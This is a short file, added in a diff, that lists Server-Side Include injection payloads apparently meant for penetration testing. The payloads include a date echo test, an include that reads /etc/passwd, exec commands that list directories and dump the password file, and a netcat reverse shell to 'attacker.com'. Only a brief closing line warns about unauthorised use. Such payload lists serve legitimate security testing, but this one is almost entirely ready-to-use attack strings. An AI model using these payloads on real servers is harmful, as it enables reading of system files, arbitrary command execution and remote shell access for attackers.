@@ -1,0 +1,36 @@
+Common SSI Injection Payloads
+Here are some example payloads you can use to test for SSI vulnerabilities:
+
+1. Basic SSI Execution Test
+html
+Copy
+Edit
+<!--#echo var="DATE_LOCAL"-->
+Expected Behavior: If the server processes SSI, it will return the current date/time.
+
+2. File Disclosure
+html
+Copy
+Edit
+<!--#include file="/etc/passwd"-->
+Expected Behavior: If successful, this could leak system files on a Unix-based server.
+
+3. Command Execution
+html
+Copy
+Edit
+<!--#exec cmd="ls -la"-->
+html
+Copy
+Edit
+<!--#exec cmd="cat /etc/passwd"-->
+Expected Behavior: Executes system commands, potentially exposing sensitive data.
+
+4. Reverse Shell Example
+If the server allows execution, you might be able to establish a reverse shell:
+
+html
+Copy
+Edit
+<!--#exec cmd="nc -e /bin/sh attacker.com 4444"-->
+Warning: Running this on a live server without permission is illegal.
